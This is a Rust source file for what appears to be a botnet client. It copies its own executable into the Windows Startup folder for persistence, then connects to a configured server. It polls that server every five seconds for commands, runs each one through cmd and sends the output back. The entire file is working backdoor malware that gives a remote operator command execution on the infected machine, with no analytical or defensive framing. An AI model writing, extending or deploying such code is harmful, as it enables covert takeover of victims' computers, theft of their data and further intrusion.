use bnet_core::{models, protocol, utils, config};
use std::net::TcpStream;

mod terminal;

fn main() {
    std::process::Command::new("cmd")
        .args([
            "/c",
            "copy",
            format!("{}", get_exec_name().unwrap()).as_str(),
            r"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
        ])
        .output()
        .unwrap();
    match TcpStream::connect(config::IP) {
        Ok(stream) => {
            println!("Successfully connected to server in port 7878");

            let established_connection = utils::send_request_check(
                &stream,
                &protocol::TRY_ESTABLISH_CONNECTION,
                &protocol::CONNECTION_ESTABLISHED,
            );

            if established_connection {
                loop {
                    std::thread::sleep(std::time::Duration::from_millis(5000));
                    let response = utils::send_request(&stream, &protocol::ACTION_REQUEST);
                    if response == protocol::ACTION_RESPONSE {
                        let args = response.get_msg().split(", ").collect::<Vec<&str>>();
                        let args_formated = args
                            .iter()
                            .map(|x| x.replace('\"', ""))
                            .collect::<Vec<String>>();
                        println!("{:?}", args_formated);
                        match std::process::Command::new("cmd")
                            .args(args_formated)
                            .output()
                        {
                            Ok(result) => {
                                let result_string =
                                    String::from_utf8_lossy(&result.stdout).trim().to_string();
                                let result_err =
                                    String::from_utf8_lossy(&result.stderr).trim().to_string();
                                let ACTION_RESULT: models::Request = models::Request {
                                    syl: 'A',
                                    num: '5',
                                    msg: if result.status.success() {
                                        result_string
                                    } else {
                                        result_string + " " + &result_err
                                    },
                                };
                                utils::send_request(&stream, &ACTION_RESULT);
                            }
                            Err(e) => {
                                let ACTION_RESULT: models::Request = models::Request {
                                    syl: 'A',
                                    num: '5',
                                    msg: e.to_string(),
                                };
                                utils::send_request(&stream, &ACTION_RESULT);
                                println!("Failed to execute: {}", e);
                            }
                        };
                    }
                }
            }
            utils::send_request_check(
                &stream,
                &protocol::CONNECTION_CLOSED,
                &protocol::CONNECTION_CLOSED,
            );
        }
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}

fn get_exec_name() -> Option<String> {
    std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok())
}
